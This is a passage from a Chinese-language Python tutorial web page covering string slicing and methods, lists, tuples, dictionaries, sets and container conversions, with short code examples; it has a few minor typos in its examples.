<h3 id="7-3-2-演示"><a href="#7-3-2-演示" class="headerlink" title="7.3.2 演示"></a>7.3.2 演示</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;abcdefg&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">2</span>:<span class="number">5</span>:<span class="number">1</span>]) <span class="comment"># cde</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">2</span>:<span class="number">5</span>]) <span class="comment"># cde</span></span><br><span class="line"><span class="built_in">print</span>(name[:<span class="number">5</span>]) <span class="comment"># abcde</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">1</span>:]) <span class="comment"># bcdefg</span></span><br><span class="line"><span class="built_in">print</span>(name[:]) <span class="comment"># abcdefg</span></span><br><span class="line"><span class="built_in">print</span>(name[::<span class="number">2</span>]) <span class="comment"># aceg</span></span><br><span class="line"><span class="built_in">print</span>(name[:-<span class="number">1</span>]) <span class="comment"># abcdef, 负1表示倒数第⼀个数据</span></span><br><span class="line"><span class="built_in">print</span>(name[-<span class="number">4</span>:-<span class="number">1</span>]) <span class="comment"># def</span></span><br><span class="line"><span class="built_in">print</span>(name[::-<span class="number">1</span>]) <span class="comment"># gfedcba</span></span><br></pre></td></tr></table></figure>

<h2 id="7-4-常用⽅法"><a href="#7-4-常用⽅法" class="headerlink" title="7.4 常用⽅法"></a>7.4 常用⽅法</h2><h3 id="7-4-1-查找"><a href="#7-4-1-查找" class="headerlink" title="7.4.1 查找"></a>7.4.1 查找</h3><table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>find()</td>
<td>字符串序列.find(⼦串, 开始位置下标, 结束位置下标)</td>
<td>检测某个⼦串是否包含在这个字符串中，如果在返回这个⼦串开始的位置下标，否则则返回-1。</td>
</tr>
<tr>
<td>index()</td>
<td>字符串序列.index(⼦串, 开始位置下标, 结束位置下标)</td>
<td>检测某个⼦串是否包含在这个字符串中，如果在返回这个⼦串开始的位置下标，否则则报异常。</td>
</tr>
<tr>
<td>rfind()</td>
<td></td>
<td>和find()功能相同，但查找⽅向为右侧开始。</td>
</tr>
<tr>
<td>rindex()</td>
<td></td>
<td>和index()功能相同，但查找⽅向为右侧开始。</td>
</tr>
<tr>
<td>count()</td>
<td>字符串序列.count(⼦串, 开始位置下标, 结束位置下标)</td>
<td>返回某个⼦串在字符串中出现的次数</td>
</tr>
</tbody></table>
<h3 id="7-4-2-修改"><a href="#7-4-2-修改" class="headerlink" title="7.4.2 修改"></a>7.4.2 修改</h3><table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>replace()</td>
<td>字符串序列.replace(旧⼦串, 新⼦串, 替换次数)</td>
<td>替换</td>
</tr>
<tr>
<td>split()</td>
<td>字符串序列.split(分割字符, num)</td>
<td>按照指定字符分割字符串。num，替换次数</td>
</tr>
<tr>
<td>join()</td>
<td>字符或⼦串.join(多字符串组成的序列)</td>
<td>⽤⼀个字符或⼦串合并字符串，即是将多个字符串合并为⼀个新的字符串。</td>
</tr>
<tr>
<td>capitalize()</td>
<td>mystr.capitalize()</td>
<td>将字符串第⼀个字符转换成⼤写。</td>
</tr>
<tr>
<td>title()</td>
<td>mystr.title()</td>
<td>将字符串每个单词⾸字⺟转换成⼤写。</td>
</tr>
<tr>
<td>lower()</td>
<td>mystr.lower()</td>
<td>将字符串中⼤写转⼩写。</td>
</tr>
<tr>
<td>upper()</td>
<td>mystr.upper()</td>
<td>将字符串中⼩写转⼤写。</td>
</tr>
<tr>
<td>lstrip()</td>
<td>mystr.lstrip()</td>
<td>删除字符串左侧空⽩字符。</td>
</tr>
<tr>
<td>rstrip()</td>
<td>mystr.rstrip()</td>
<td>删除字符串右侧空⽩字符。</td>
</tr>
<tr>
<td>strip()</td>
<td>mystr.strip()</td>
<td>删除字符串两侧空⽩字符。</td>
</tr>
<tr>
<td>ljust()</td>
<td>mystr.ljust()</td>
<td>返回⼀个原字符串左对⻬,并使⽤指定字符(默认空格)填充⾄对应⻓度的新字符串。</td>
</tr>
</tbody></table>
<blockquote>
<p>注意：</p>
<ul>
<li>字符串属于不可变类型，修改的时候其他不是修改原本的字符串，而是返回一个新的字符串。</li>
</ul>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = (<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;cc&#x27;</span>, <span class="string">&#x27;ddd&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;_&#x27;</span>.join(list1)) <span class="comment"># 结果：aa_b_cc_ddd</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;...&#x27;</span>.join(t1))  <span class="comment"># 结果：aa...b...cc...ddd</span></span><br></pre></td></tr></table></figure>
<h3 id="7-4-3-判断"><a href="#7-4-3-判断" class="headerlink" title="7.4.3 判断"></a>7.4.3 判断</h3><table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>startswith()</td>
<td>字符串序列.startswith(⼦串, 开始位置下标, 结束位置下标)</td>
<td>检查字符串是否是以指定⼦串开头，是则返回 True，否则返回 False。如果设置开始和结束位置下标，则在指定范围内检查。</td>
</tr>
<tr>
<td>endswith()</td>
<td>字符串序列.endswith(⼦串, 开始位置下标, 结束位置下标)</td>
<td>检查字符串是否是以指定⼦串结尾，是则返回 True，否则返回 False。如果设置开始和结束位置下标，则在指定范围内检查。</td>
</tr>
<tr>
<td>isalpha()</td>
<td></td>
<td>如果字符串不为空并且所有字符都是字⺟则返回 True, 否则返回 False。</td>
</tr>
<tr>
<td>isdigit()</td>
<td></td>
<td>如果字符串只包含数字则返回 True 否则返回 False。</td>
</tr>
<tr>
<td>isalnum()</td>
<td></td>
<td>如果字符串不为空并且所有字符都是字⺟或数字则返回 True,否则返回 False。</td>
</tr>
<tr>
<td>isspace()</td>
<td></td>
<td>如果字符串中只包含空⽩，则返回 True，否则返回 False。</td>
</tr>
</tbody></table>
<h1 id="8-列表和元组"><a href="#8-列表和元组" class="headerlink" title="8. 列表和元组"></a>8. 列表和元组</h1><h2 id="8-1-列表"><a href="#8-1-列表" class="headerlink" title="8.1 列表"></a>8.1 列表</h2><h3 id="8-1-1-语法"><a href="#8-1-1-语法" class="headerlink" title="8.1.1 语法"></a>8.1.1 语法</h3><p>列表可以⼀次性存储多个数据，且可以为不同数据类型。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[数据<span class="number">1</span>, 数据<span class="number">2</span>, 数据<span class="number">3</span>, 数据<span class="number">4.</span>.....]</span><br></pre></td></tr></table></figure>
<h3 id="8-1-2-常用方法"><a href="#8-1-2-常用方法" class="headerlink" title="8.1.2 常用方法"></a>8.1.2 常用方法</h3><h4 id="1-增加"><a href="#1-增加" class="headerlink" title="1. 增加"></a>1. 增加</h4><table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>append()</td>
<td>列表序列.append(数据)</td>
<td>列表结尾追加数据。</td>
</tr>
<tr>
<td>extend()</td>
<td>列表序列.extend(数据)</td>
<td>列表结尾追加数据，如果数据是⼀个序列，则将这个序列的数据逐⼀添加到列表。</td>
</tr>
<tr>
<td>insert()</td>
<td>列表序列.insert(位置下标, 数据)</td>
<td>指定位置新增数据。</td>
</tr>
</tbody></table>
<h4 id="2-删除"><a href="#2-删除" class="headerlink" title="2. 删除"></a>2. 删除</h4><table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>del</td>
<td>del ⽬标</td>
<td>删除数据，可以是整个列表，也可以是列表中的某个元素</td>
</tr>
<tr>
<td>pop()</td>
<td>列表序列.pop(下标)</td>
<td>删除指定下标的数据(默认为最后⼀个)，并返回该数据。</td>
</tr>
<tr>
<td>remove()</td>
<td>列表序列.remove(数据)</td>
<td>移除列表中某个数据的第⼀个匹配项。</td>
</tr>
<tr>
<td>clear()</td>
<td></td>
<td>清空列表</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name_list = [<span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;Lily&#x27;</span>, <span class="string">&#x27;Rose&#x27;</span>]</span><br><span class="line"><span class="keyword">del</span> name_list[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(name_list)  <span class="comment"># 结果：[&#x27;Lily&#x27;, &#x27;Rose&#x27;]</span></span><br><span class="line"><span class="keyword">del</span> name_list</span><br></pre></td></tr></table></figure>
<h4 id="3-修改"><a href="#3-修改" class="headerlink" title="3. 修改"></a>3. 修改</h4><blockquote>
<p>可以通过坐标直接修改</p>
</blockquote>
<table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>reverse()</td>
<td></td>
<td>逆置</td>
</tr>
<tr>
<td>sort()</td>
<td></td>
<td>排序</td>
</tr>
</tbody></table>
<h4 id="4-查找"><a href="#4-查找" class="headerlink" title="4. 查找"></a>4. 查找</h4><p>  既可以通过下标查找，也可以通过函数查找。</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>index()</td>
<td>列表序列.index(数据, 开始位置下标, 结束位置下标)</td>
<td>返回指定数据所在位置的下标。</td>
</tr>
<tr>
<td>count()</td>
<td>list1.count(data)</td>
<td>统计指定数据在当前列表中出现的次数。</td>
</tr>
<tr>
<td>len()</td>
<td></td>
<td>访问列表⻓度，即列表中数据的个数。</td>
</tr>
<tr>
<td>in</td>
<td></td>
<td>判断指定数据在某个列表序列，如果在返回True，否则返回False。</td>
</tr>
<tr>
<td>not in</td>
<td></td>
<td>判断指定数据不在某个列表序列，如果不在返回True，否则返回False。</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name_list = [<span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;Lily&#x27;</span>, <span class="string">&#x27;Rose&#x27;</span>]</span><br><span class="line">name = <span class="built_in">input</span>(<span class="string">&#x27;请输⼊您要搜索的名字：&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> name <span class="keyword">in</span> name_list:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;您输⼊的名字是<span class="subst">&#123;name&#125;</span>, 名字已经存在&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;您输⼊的名字是<span class="subst">&#123;name&#125;</span>, 名字不存在&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>复制 copy()</li>
</ul>
<h2 id="8-2-元组"><a href="#8-2-元组" class="headerlink" title="8.2 元组"></a>8.2 元组</h2><p>元组与列表十分相似，可以一次存储多个不同类型的数据，但**元组中的数据不可修改.**。</p>
<p><strong>如果元组里面有列表，列表里的数据是可以修改的。</strong></p>
<h3 id="8-2-1-语法"><a href="#8-2-1-语法" class="headerlink" title="8.2.1 语法"></a>8.2.1 语法</h3><p>使⽤⼩括号，且逗号隔开各个数据，数据可以是不同的数据类型。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 多个数据元组</span></span><br><span class="line">t1 = (<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 单个数据元组</span></span><br><span class="line">t2 = (<span class="number">10</span>,)</span><br></pre></td></tr></table></figure>

<p>注意：如果定义的元组只有⼀个数据，那么这个数据后⾯也好添加逗号</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t2 = (<span class="number">10</span>,)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(t2)) <span class="comment"># tuple</span></span><br><span class="line"></span><br><span class="line">t3 = (<span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(t3)) <span class="comment"># int</span></span><br><span class="line"></span><br><span class="line">t4 = (<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(t4)) <span class="comment"># str</span></span><br></pre></td></tr></table></figure>

<h3 id="8-2-2-常见方法"><a href="#8-2-2-常见方法" class="headerlink" title="8.2.2 常见方法"></a>8.2.2 常见方法</h3><blockquote>
<p>元组可以用下标查找数据</p>
</blockquote>
<table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>index()</td>
<td></td>
<td>查找某个数据，如果数据存在返回对应的下标，否则报错，语法和列表、字符串的 index ⽅法相同。</td>
</tr>
<tr>
<td>count()</td>
<td></td>
<td>统计某个数据在当前元组出现的次数。</td>
</tr>
<tr>
<td>len()</td>
<td></td>
<td>统计元组中数据的个数。</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tuple1 = (<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;cc&#x27;</span>, <span class="string">&#x27;bb&#x27;</span>)</span><br><span class="line">tuple1[<span class="number">0</span>] = <span class="string">&#x27;aaa&#x27;</span>  <span class="comment"># 报错，不能直接修改元组内的数据</span></span><br><span class="line"></span><br><span class="line">tuple2 = (<span class="number">10</span>, <span class="number">20</span>, [<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;cc&#x27;</span>], <span class="number">50</span>, <span class="number">30</span>)</span><br><span class="line"><span class="built_in">print</span>(tuple2[<span class="number">2</span>])  <span class="comment"># 访问到列表，结果：[&#x27;aa&#x27;, &#x27;bb&#x27;, &#x27;cc&#x27;]</span></span><br><span class="line">tuple2[<span class="number">2</span>][<span class="number">0</span>] = <span class="string">&#x27;aaaaa&#x27;</span>  <span class="comment"># 可以修改元组里的列表里的数据</span></span><br><span class="line"><span class="built_in">print</span>(tuple2)  <span class="comment"># 结果：(10, 20, [&#x27;aaaaa&#x27;, &#x27;bb&#x27;, &#x27;cc&#x27;], 50, 30)</span></span><br></pre></td></tr></table></figure>

<h1 id="9-字典"><a href="#9-字典" class="headerlink" title="9. 字典"></a>9. 字典</h1><p>字典的数据以键值对形式存储，数据无序，所以字典不⽀持下标。</p>
<h2 id="9-2-语法"><a href="#9-2-语法" class="headerlink" title="9.2 语法"></a>9.2 语法</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数据初始化字典</span></span><br><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 空字典</span></span><br><span class="line">dict2 = &#123;&#125;</span><br><span class="line">dict3 = <span class="built_in">dict</span>()</span><br></pre></td></tr></table></figure>

<h2 id="9-3-常见操作"><a href="#9-3-常见操作" class="headerlink" title="9.3 常见操作"></a>9.3 常见操作</h2><ol>
<li>增<br>字典序列[key] = 值<blockquote>
<p>如果key存在则修改这个key对应的值；如果key不存在则新增此键值对。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">dict1[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;Rose&#x27;</span></span><br><span class="line"><span class="comment"># 结果：&#123;&#x27;name&#x27;: &#x27;Rose&#x27;, &#x27;age&#x27;: 20, &#x27;gender&#x27;: &#x27;男&#x27;&#125;</span></span><br><span class="line"><span class="built_in">print</span>(dict1)</span><br><span class="line"></span><br><span class="line">dict1[<span class="string">&#x27;id&#x27;</span>] = <span class="number">110</span></span><br><span class="line"><span class="comment"># &#123;&#x27;name&#x27;: &#x27;Rose&#x27;, &#x27;age&#x27;: 20, &#x27;gender&#x27;: &#x27;男&#x27;, &#x27;id&#x27;: 110&#125;</span></span><br><span class="line"><span class="built_in">print</span>(dict1)</span><br></pre></td></tr></table></figure></li>
<li>删</li>
</ol>
<ul>
<li>del() / del：删除字典或删除字典中指定键值对。</li>
<li>clear()：清空字典<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">del</span> dict1[<span class="string">&#x27;gender&#x27;</span>]</span><br><span class="line"><span class="comment"># 结果：&#123;&#x27;name&#x27;: &#x27;Tom&#x27;, &#x27;age&#x27;: 20&#125;</span></span><br><span class="line"></span><br><span class="line">dict1.clear()  <span class="comment"># &#123;&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li>查</li>
</ol>
<ul>
<li>key值查找<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(dict1[<span class="string">&#x27;name&#x27;</span>]) <span class="comment"># Tom</span></span><br><span class="line"><span class="comment"># 存在时返回，不存在时报错</span></span><br></pre></td></tr></table></figure></li>
<li>get(key, 默认值)，不存在时返回默认值</li>
<li>keys()</li>
<li>values()</li>
<li>items()<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dict1.items())  </span><br><span class="line"><span class="comment"># dict_items([(&#x27;name&#x27;, &#x27;Tom&#x27;), (&#x27;age&#x27;, 20), (&#x27;gender&#x27;, &#x27;男&#x27;)])</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="9-4-循环遍历"><a href="#9-4-循环遍历" class="headerlink" title="9.4 循环遍历"></a>9.4 循环遍历</h2><ul>
<li>遍历 key<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dict1.keys():</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure></li>
<li>遍历 value<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> dict1.values():</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br></pre></td></tr></table></figure></li>
<li>遍历元素<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict1 = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span>, <span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;男&#x27;</span>&#125;</span><br><span class="line"><span class="comment"># item</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> dict1.items():</span><br><span class="line">    <span class="built_in">print</span>(item)</span><br><span class="line"></span><br><span class="line"><span class="comment"># k,v</span></span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> dict1.items():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;key&#125;</span> = <span class="subst">&#123;value&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="10-集合"><a href="#10-集合" class="headerlink" title="10. 集合"></a>10. 集合</h1><h2 id="10-1-语法"><a href="#10-1-语法" class="headerlink" title="10.1 语法"></a>10.1 语法</h2><p>创建集合使⽤ {} 或 set() ， 但是如果要<strong>创建空集合只能使⽤ set()</strong> ，因为 {} ⽤来创建空字典。<br><strong>set 去重原理： 先__hash__，再__eq__</strong></p>
<ul>
<li>特点<ul>
<li>数据不重复</li>
<li>数据无序，不支持下标<h2 id="10-2-常见方法"><a href="#10-2-常见方法" class="headerlink" title="10.2 常见方法"></a>10.2 常见方法</h2><table>
<thead>
<tr>
<th>函数</th>
<th>语法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>add()</td>
<td></td>
<td>增加元素，如果已存在于集合中，不进行任何操作</td>
</tr>
<tr>
<td>update</td>
<td></td>
<td>追加数据，必须是序列</td>
</tr>
<tr>
<td>remove()</td>
<td></td>
<td>删除集合中的指定数据，如果<strong>数据不存在则报错</strong>。</td>
</tr>
<tr>
<td>discard()</td>
<td></td>
<td>删除集合中的指定数据，如果<strong>数据不存在也不会报错</strong>。</td>
</tr>
<tr>
<td>pop()</td>
<td></td>
<td>随机删除集合中的某个数据，并返回这个数据。</td>
</tr>
<tr>
<td>in</td>
<td></td>
<td>判断数据在集合序列</td>
</tr>
<tr>
<td>not in</td>
<td></td>
<td>判断数据不在集合序列</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = &#123;<span class="number">10</span>, <span class="number">20</span>&#125;</span><br><span class="line">s1.add(<span class="number">100</span>)</span><br><span class="line">s1.add(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(s1)  <span class="comment"># &#123;100, 10, 20&#125;</span></span><br><span class="line"></span><br><span class="line">s1 = &#123;<span class="number">10</span>, <span class="number">20</span>&#125;</span><br><span class="line"><span class="comment"># s1.update(100) # 报错</span></span><br><span class="line">s1.update([<span class="number">100</span>, <span class="number">200</span>])</span><br><span class="line">s1.update(<span class="string">&#x27;abc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s1)  <span class="comment"># &#123; &#x27;b&#x27;, &#x27;a&#x27;, &#x27;c&#x27;, 200, 100 , 10, 20 &#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="11-容器类型公有方法"><a href="#11-容器类型公有方法" class="headerlink" title="11. 容器类型公有方法"></a>11. 容器类型公有方法</h1><h2 id="11-1-运算符"><a href="#11-1-运算符" class="headerlink" title="11.1 运算符"></a>11.1 运算符</h2><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>⽀持的容器类型</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>合并</td>
<td>字符串、列表、元组</td>
</tr>
<tr>
<td>*</td>
<td>复制</td>
<td>字符串、列表、元组</td>
</tr>
<tr>
<td>in</td>
<td>元素是否存在</td>
<td>字符串、列表、元组、字典</td>
</tr>
<tr>
<td>not in</td>
<td>元素是否不存在</td>
<td>字符串、列表、元组、字典</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 字符串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span> * <span class="number">10</span>)  <span class="comment"># ----------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 列表</span></span><br><span class="line">list1 = [<span class="string">&#x27;hello&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(list1 * <span class="number">4</span>)  <span class="comment"># [&#x27;hello&#x27;, &#x27;hello&#x27;, &#x27;hello&#x27;, &#x27;hello&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 元组</span></span><br><span class="line">t1 = (<span class="string">&#x27;world&#x27;</span>,)</span><br><span class="line"><span class="built_in">print</span>(t1 * <span class="number">4</span>)  <span class="comment"># (&#x27;world&#x27;, &#x27;world&#x27;, &#x27;world&#x27;, &#x27;world&#x27;)</span></span><br></pre></td></tr></table></figure>

<h2 id="11-2-方法"><a href="#11-2-方法" class="headerlink" title="11.2 方法"></a>11.2 方法</h2><table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>len()</td>
<td>计算容器中元素个数</td>
</tr>
<tr>
<td>del 或 del()</td>
<td>删除</td>
</tr>
<tr>
<td>max()</td>
<td>返回容器中元素最⼤值</td>
</tr>
<tr>
<td>min()</td>
<td>返回容器中元素最⼩值</td>
</tr>
<tr>
<td>range(start,end, step)</td>
<td>⽣成从start到end的数字，步⻓为 step，供for循环使⽤</td>
</tr>
<tr>
<td>enumerate()</td>
<td>⽤于将⼀个可遍历的数据对象(如列表、元组或字符串)组合为⼀个索引序列，同时列出数据和数据下标，⼀般⽤在 for 循环当中。</td>
</tr>
</tbody></table>
<p>enumerate(可遍历对象, start=0)</p>
<blockquote>
<p>start参数⽤来设置遍历数据的下标的起始值，默认为0。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(list1):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="comment"># (0, &#x27;a&#x27;)</span></span><br><span class="line"><span class="comment"># (1, &#x27;b&#x27;)</span></span><br><span class="line"><span class="comment">#   ... </span></span><br><span class="line"><span class="comment"># (4m &#x27;e&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(list1, start=<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;下标是<span class="subst">&#123;index&#125;</span>, 对应的字符是<span class="subst">&#123;char&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="comment"># start = 1，下标从1开始，而不是0</span></span><br></pre></td></tr></table></figure>

<h2 id="11-3-容器类型转换"><a href="#11-3-容器类型转换" class="headerlink" title="11.3 容器类型转换"></a>11.3 容器类型转换</h2><p>python 常见的几种容器：str, list, tuple, dict, set</p>
<ul>
<li>tuple()<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>, <span class="number">20</span>]</span><br><span class="line">s1 = &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="number">500</span>&#125;  <span class="comment"># set</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>(list1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>(s1))</span><br></pre></td></tr></table></figure></li>
<li>list()<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t1 = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">s1 = &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="number">500</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(t1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(s1))</span><br></pre></td></tr></table></figure></li>
<li>set()<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list1 = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>, <span class="number">20</span>]</span><br><span class="line">t1 = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(list1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(t1))</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="12-推导式"><a href="#12-推导式" class="headerlink" title="12. 推导式"></a>12. 推导式</h1><h2 id="12-1-列表推导式"><a href="#12-1-列表推导式" class="headerlink" title="12.1 列表推导式"></a>12.1 列表推导式</h2><p>⽤⼀个表达式创建⼀个有规律的列表或控制⼀个有规律列表。</p>
<ul>
